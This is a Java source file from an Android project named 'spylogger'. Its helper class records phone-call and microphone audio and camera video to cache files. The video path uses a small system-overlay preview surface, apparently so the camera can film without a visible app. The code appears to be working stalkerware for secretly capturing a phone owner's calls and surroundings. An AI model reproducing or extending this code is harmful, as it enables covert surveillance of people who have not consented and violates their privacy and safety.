package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import lombok.Getter;
import lombok.Setter;

/**
 * Created by bruno on 20/11/16.
 */

@Getter
@Setter
public class MediaRecorderHelper implements MediaRecorder.OnInfoListener, SurfaceHolder.Callback {

    public static final int MEDIA_TYPE_IMAGE = 1;
    public static final int MEDIA_TYPE_VIDEO = 2;


    private Context context;
    private MediaRecorder recorder;
    private File recordedFile;
    private boolean ligacao;
    private int maxDuration;
    private boolean recording;
    private long duration;
    private Date inicio;
    private TaskComplete callback;
    private boolean frontCamera;
    private Camera mCamera;
    private SurfaceHolder mHolder;
    private SurfaceView preview;
    private boolean isPreviewing;
    private boolean startCommand;

    @Setter
    private boolean video;


    public MediaRecorderHelper(Context context, int maxDuration, boolean video) throws IOException {
        this.context = context;
        this.maxDuration = maxDuration * 1000;
        this.video=video;
    }

    private void prepareAudio() throws IOException {
        recordedFile = File.createTempFile("record", ".mp4", context.getCacheDir());

        if (ligacao) {
            try {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(recordedFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setOnInfoListener(this);

                recorder.prepare();

            } catch (IOException e) {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(recordedFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setOnInfoListener(this);

                recorder.prepare();
            }
        } else {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(recordedFile.getAbsolutePath());
            recorder.setMaxDuration(maxDuration);
            recorder.setOnInfoListener(this);

            recorder.prepare();
        }

        recording = false;
    }

    private void prePrepareVideo() {
        preview = new SurfaceView(context);
        mHolder = preview.getHolder();
        mHolder.addCallback(this);

        mHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

        WindowManager wm = (WindowManager) context
                .getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                100, 100, //Must be at least 1x1
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                0,
                //Don't know if this is a safe default
                PixelFormat.UNKNOWN);

        //Don't set the preview visibility to GONE or INVISIBLE
        wm.addView(preview, params);
        mCamera = getCamera();
    }

    @SuppressWarnings("deprecation")
    private void prepareVideo() throws IOException {
        recordedFile = File.createTempFile("record", ".mp4", context.getCacheDir());

        recorder = new MediaRecorder();

        // Step 1: Unlock and set camera to MediaRecorder
        mCamera.unlock();
        recorder.setCamera(mCamera);

        // Step 2: Set sources
        recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);

        // Step 3: Set a CamcorderProfile (requires API Level 8 or higher)
        recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_480P));

        // Step 4: Set output file
        recorder.setOutputFile(recordedFile.toString());

        // Step 5: Set the preview output
        recorder.setPreviewDisplay(preview.getHolder().getSurface());

        recorder.setMaxDuration(maxDuration > 30000 ? 30000 : maxDuration);
        recorder.setOnInfoListener(this);
        try {
            recorder.prepare();
            isPreviewing = true;
        } catch (Exception e) {
            isPreviewing = false;
            throw new IOException(e);
        }

    }

    private Camera getCamera() {
        return Camera.open(frontCamera ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK);
    }

    private void releaseMediaRecorder() {
        if (recorder != null) {
            recorder.stop();
            recorder.reset();   // clear recorder configuration
            recorder.release(); // release the recorder object
            recorder = null;
            if (isVideo() && mCamera!=null) {
                mCamera.stopPreview();
                mCamera.release();
            }
//            mCamera.lock();           // lock camera for later use
        }
    }

    public void start() throws IOException {
        startCommand = true;
        if (recorder == null) {
            if (!isVideo()) {
                prepareAudio();
            } else {
                prePrepareVideo();
            }
        } else {
            if (!isVideo()) {
                recorder.start();
            } else {
                if (isPreviewing) {
                    recorder.start();
                }
            }
        }
        duration = 0;
        inicio = new Date();
        recording = true;
    }

    public void stop() {
        releaseMediaRecorder();
        duration = ((inicio.getTime() - (new Date()).getTime()) / 1000);
        recording = false;
        isPreviewing = false;
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        if (callback != null) {
            callback.onFinish(null);
        }
    }

    @Override
    public void onInfo(MediaRecorder mediaRecorder, int what, int i1) {
        if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
            stop();
        }
    }


    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            mCamera.setPreviewDisplay(holder);
            mCamera.startPreview();
            prepareVideo();
            if(startCommand) {
                start();
            }
        } catch (IOException e) {
            isPreviewing = false;
            Log.d("SPYLOGGER", "Error setting camera preview: " + e.getMessage());
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        // If your preview can change or rotate, take care of those events here.
        // Make sure to stop the preview before resizing or reformatting it.

        if (mHolder.getSurface() == null) {
            // preview surface does not exist
            return;
        }

        // stop preview before making changes
        try {
            mCamera.stopPreview();
        } catch (Exception e) {
            // ignore: tried to stop a non-existent preview
        }

        // set preview size and make any resize, rotate or
        // reformatting changes here

        // start preview with new settings
        try {
            mCamera.setPreviewDisplay(mHolder);
            mCamera.startPreview();

        } catch (Exception e) {
            Log.d("SPYLOGGER", "Error starting camera preview: " + e.getMessage());
        }
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }
}
